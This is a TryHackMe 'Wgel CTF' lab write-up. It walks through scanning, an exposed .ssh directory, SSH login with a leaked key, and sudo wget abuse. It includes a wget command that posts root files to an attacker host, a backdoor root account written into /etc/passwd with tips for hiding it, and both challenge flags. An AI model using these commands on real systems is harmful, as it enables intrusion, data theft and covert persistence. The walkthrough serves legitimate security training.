# Write Up for Try Hack Me box - [Wgel CTF](https://tryhackme.com/room/wgelctf)

Easy Box with certain misconfigurations and sudo PrivEsc with wget binary.

> Pratyush Prakhar (5#1NC#4N) - 10/29/2023

## RECONNAISSANCE

1. Scan the box with rustscan.
	1. Full port scan --> [nmap file here](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Wgel%20CTF/rustscan/all.nmap).

	**Results**

	```bash
	$ rustscan --range 1-65535 -a 10.10.254.96 -- -oN rustscan/all.nmap 
	.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
	| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
	| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
	`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
	The Modern Day Port Scanner.
	________________________________________
	: http://discord.skerritt.blog           :
	: https://github.com/RustScan/RustScan :
	--------------------------------------
	Nmap? More like slowmap.🐢

	[~] The config file is expected to be at "/home/kali/.rustscan.toml"
	[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
	[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
	Open 10.10.254.96:22
	Open 10.10.254.96:80
	[~] Starting Script(s)
	[>] Running script "nmap -vvv -p {{port}} {{ip}} -oN rustscan/all.nmap" on ip 10.10.254.96
	Depending on the complexity of the script, results may take some time to appear.
	[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 20:00 IST
	Initiating Ping Scan at 20:00
	Scanning 10.10.254.96 [2 ports]
	Completed Ping Scan at 20:00, 0.17s elapsed (1 total hosts)
	Initiating Parallel DNS resolution of 1 host. at 20:00
	Completed Parallel DNS resolution of 1 host. at 20:00, 0.05s elapsed
	DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
	Initiating Connect Scan at 20:00
	Scanning 10.10.254.96 [2 ports]
	Discovered open port 80/tcp on 10.10.254.96
	Discovered open port 22/tcp on 10.10.254.96
	Completed Connect Scan at 20:00, 0.15s elapsed (2 total ports)
	Nmap scan report for 10.10.254.96
	Host is up, received syn-ack (0.17s latency).
	Scanned at 2023-11-05 20:00:32 IST for 0s

	PORT   STATE SERVICE REASON
	22/tcp open  ssh     syn-ack
	80/tcp open  http    syn-ack

	Read data files from: /usr/bin/../share/nmap
	Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds

	```

	2. Full Service and Scripts scan on the found ports. --> [nmap file here](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Wgel%20CTF/rustscan/main.nmap)

	**Results**

	```bash
	$ rustscan --ports 22,80 -a 10.10.254.96 -- -sC -sV -oN rustscan/main.nmap 
	.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
	| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
	| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
	`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
	The Modern Day Port Scanner.
	________________________________________
	: http://discord.skerritt.blog           :
	: https://github.com/RustScan/RustScan :
	--------------------------------------
	0day was here ♥

	[~] The config file is expected to be at "/home/kali/.rustscan.toml"
	[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
	[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
	Open 10.10.254.96:22
	Open 10.10.254.96:80
	[~] Starting Script(s)
	[>] Running script "nmap -vvv -p {{port}} {{ip}} -sC -sV -oN rustscan/main.nmap" on ip 10.10.254.96
	Depending on the complexity of the script, results may take some time to appear.
	[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 20:07 IST
	NSE: Loaded 156 scripts for scanning.
	NSE: Script Pre-scanning.
	NSE: Starting runlevel 1 (of 3) scan.
	Initiating NSE at 20:07
	Completed NSE at 20:07, 0.00s elapsed
	NSE: Starting runlevel 2 (of 3) scan.
	Initiating NSE at 20:07
	Completed NSE at 20:07, 0.00s elapsed
	NSE: Starting runlevel 3 (of 3) scan.
	Initiating NSE at 20:07
	Completed NSE at 20:07, 0.00s elapsed
	Initiating Ping Scan at 20:07
	Scanning 10.10.254.96 [2 ports]
	Completed Ping Scan at 20:07, 0.16s elapsed (1 total hosts)
	Initiating Parallel DNS resolution of 1 host. at 20:07
	Completed Parallel DNS resolution of 1 host. at 20:07, 0.05s elapsed
	DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
	Initiating Connect Scan at 20:07
	Scanning 10.10.254.96 [2 ports]
	Discovered open port 22/tcp on 10.10.254.96
	Discovered open port 80/tcp on 10.10.254.96
	Completed Connect Scan at 20:07, 0.18s elapsed (2 total ports)
	Initiating Service scan at 20:07
	Scanning 2 services on 10.10.254.96
	Completed Service scan at 20:07, 6.32s elapsed (2 services on 1 host)
	NSE: Script scanning 10.10.254.96.
	NSE: Starting runlevel 1 (of 3) scan.
	Initiating NSE at 20:07
	Completed NSE at 20:07, 5.24s elapsed
	NSE: Starting runlevel 2 (of 3) scan.
	Initiating NSE at 20:07
	Completed NSE at 20:07, 0.68s elapsed
	NSE: Starting runlevel 3 (of 3) scan.
	Initiating NSE at 20:07
	Completed NSE at 20:07, 0.00s elapsed
	Nmap scan report for 10.10.254.96
	Host is up, received syn-ack (0.17s latency).
	Scanned at 2023-11-05 20:07:15 IST for 13s

	PORT   STATE SERVICE REASON  VERSION
	22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
	| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpgV7/18RfM9BJUBOcZI/eIARrxAgEeD062pw9L24Ulo5LbBeuFIv7hfRWE/kWUWdqHf082nfWKImTAHVMCeJudQbKtL1SBJYwdNo6QCQyHkHXslVb9CV1Ck3wgcje8zLbrml7OYpwBlumLVo2StfonQUKjfsKHhR+idd3/P5V3abActQLU8zB0a4m3TbsrZ9Hhs/QIjgsEdPsQEjCzvPHhTQCEywIpd/GGDXqfNPB0Yl/dQghTALyvf71EtmaX/fsPYTiCGDQAOYy3RvOitHQCf4XVvqEsgzLnUbqISGugF8ajO5iiY2GiZUUWVn4MVV1jVhfQ0kC3ybNrQvaVcXd
	|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDCxodQaK+2npyk3RZ1Z6S88i6lZp2kVWS6/f955mcgkYRrV1IMAVQ+jRd5sOKvoK8rflUPajKc9vY5Yhk2mPj8=
	|   256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhXt+ZEjzJRbb2rVnXOzdp5kDKb11LfddnkcyURkYke
	80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
	|_http-title: Apache2 Ubuntu Default Page: It works
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

	NSE: Script Post-scanning.
	NSE: Starting runlevel 1 (of 3) scan.
	Initiating NSE at 20:07
	Completed NSE at 20:07, 0.00s elapsed
	NSE: Starting runlevel 2 (of 3) scan.
	Initiating NSE at 20:07
	Completed NSE at 20:07, 0.00s elapsed
	NSE: Starting runlevel 3 (of 3) scan.
	Initiating NSE at 20:07
	Completed NSE at 20:07, 0.00s elapsed
	Read data files from: /usr/bin/../share/nmap
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 13.01 seconds
	```

2. There are **2 TCP** ports open. 
	1. *Port 22* - SSH - **OpenSSH 7.2p2** 
	2. *Port 80* - WEB - **Apache httpd 2.4.18**

3. Let's explore in order of WEB --> SSH.


## WEB

1. Let's first check out the web server on port 80. 
	1. We get a default page with no links going out. - Default Apache page.
	\
	![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Wgel%20CTF/images/web.png)
	\
	2. We will go for the low hanging fruit - robots, page source and try to get some information. - We get that there might be a useful username leaked here - `jessie`.
	\
	![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Wgel%20CTF/images/ps.png)
	\
	3. We can also run other enumerations on the side as `subdomain` and `nikto`. Check [here](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Wgel%20CTF/web/nikto.txt).
	4. Look through a proxy to get more details on the request:response model setup. Nothing to go on.
	5. We can run sub domain check on this port using `feroxbuster`.


2. The directory brute forcing can turn into a rabbit hole if a proper wordlist is not used. *This box is the perfect example of it*. I usually work with raft wordlists as part as part of Seclists. But in this case it will miss a key file as `.<files>` are not included in most. So, we need to take a step back and work with an old friend. I will let you look into that. We found following interesting sub-dirs.
	1. `/sitemap` --> Hosts UNAPP which seems like an in-house products. There is no further information obtained from this page. We can also look into the contact us page but it was a bust. Sad that no XSS, CSRF will be possible.
	2. But to our surprise `/sitemap/.ssh` turned up. Someone forgot to close out their directory listing. Sad for jessie.
	\
	![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Wgel%20CTF/images/ssh.png)
	\

## INITIAL ACCESS - SSH

1. Using the obtained [ssh key](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Wgel%20CTF/web/sitemap/id_rsa) for jessie (she left her info and forgot. Update later is a joke.), we get on the system.

2. We can now read the `user flag` and perform other enumerations.

```bash
$ ssh -i jessie/id_rsa jessie@10.10.254.96
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

Last login: Sun Nov  5 16:59:07 2023 from 10.17.88.193
jessie@CorpOne:~$ ls
Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos
jessie@CorpOne:~$ cd Desktop/
jessie@CorpOne:~/Desktop$ ls
jessie@CorpOne:~/Desktop$ ls -la
total 8
drwxr-xr-x  2 jessie jessie 4096 oct 26  2019 .
drwxr-xr-x 17 jessie jessie 4096 oct 26  2019 ..
jessie@CorpOne:~/Desktop$ cd ..
jessie@CorpOne:~$ cd Documents/
jessie@CorpOne:~/Documents$ ls -la
total 12
drwxr-xr-x  2 jessie jessie 4096 oct 26  2019 .
drwxr-xr-x 17 jessie jessie 4096 oct 26  2019 ..
-rw-rw-r--  1 jessie jessie   33 oct 26  2019 user_flag.txt
jessie@CorpOne:~/Documents$ cat user_flag.txt 
********************************
```

3. The linpeas results can be found [here](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Wgel%20CTF/ssh/tmp/linout_jessie.txt).

## PRIVESC

1. On basic manual enum, we found that `wget` binary can be run as `root` with no password. Let's use this path with help of [GTFOBins](https://gtfobins.github.io/gtfobins/wget/#sudo) to escalate our privileges. But it doesn't seem to work. So, we can look into following ways to read the files.

```bash
jessie@CorpOne:~/Documents$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

2. We can read some sensitive files using the following methods.
	1. Download the file from victim to attacker machine.
		1. Start a server on the attacker machine. 
		2. Now we can post a file to the server from the attacker machine. In the case, we will transfer over the root flag.

		**Victim Machine**
		```bash
		jessie@CorpOne:~$ sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.17.88.193:1337
		--2023-11-05 20:03:36--  http://10.17.88.193:1337/
		Connecting to 10.17.88.193:1337... connected.
		HTTP request sent, awaiting response... 
		```

		**Attacker Machine**
		```bash
		$ nc -lnvvp 1337
		listening on [any] 1337 ...
		connect to [10.17.88.193] from (UNKNOWN) [10.10.82.96] 59352
		POST / HTTP/1.1
		User-Agent: Wget/1.17.1 (linux-gnu)
		Accept: */*
		Accept-Encoding: identity
		Host: 10.17.88.193:1337
		Connection: Keep-Alive
		Content-Type: application/x-www-form-urlencoded
		Content-Length: 33

		********************************
		```
	2. Read the file locally

		**Victim Machine**
		```bash
		jessie@CorpOne:~$ sudo /usr/bin/wget -i /root/root_flag.txt
		--2023-11-05 20:07:22--  http://<root flag>/
		```
		
	3. Obtaining the root flag allows us to PWN the box. 

## EXTRA TREAT 

1. We can now obtain the [following files](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Wgel%20CTF/ssh/etc) easily that can be used later in the above way.
	1. **/etc/passwd**
	2. **/etc/shadow**
	3. **/etc/hosts**
	4. **/etc/sudoers**
	5. **/etc/crontab**

2. We can also get into the system by a very old trick. We have access to `passwd file` and also a way to put it back with `wget -O /etc/passwd`. Let's add a user `shinchan` with root permissions and once he is put in the system, we can switch to it to exploit the box.
	1. To hide shift the new user to shadow file. Easier to hide.
	2. Can also put the same creds as part of another user to not raise other suspicions. 

**Result**

```bash
jessie@CorpOne:~$ cat /etc/passwd | grep shinchan
shinchan:$1$pqGuNJBM$oqxaxUoRIWMgaxKixLuFe0:0:0:root:/root:/bin/bash
jessie@CorpOne:~$ su shinchan 
Password: 
root@CorpOne:/home/jessie# whoami
root
```

## BROWNIE POINTS

1. User flag - **057c67131c3d5e42dd5cd3075b198ff6**

2. Root flag - **b1b968b37519ad1daa6408188649263d**


**Stay Tuned On**\
[GitHub](https://github.com/pratty010/Boxes)\
[LinkedIn](https://www.linkedin.com/in/pratyush-prakhar/)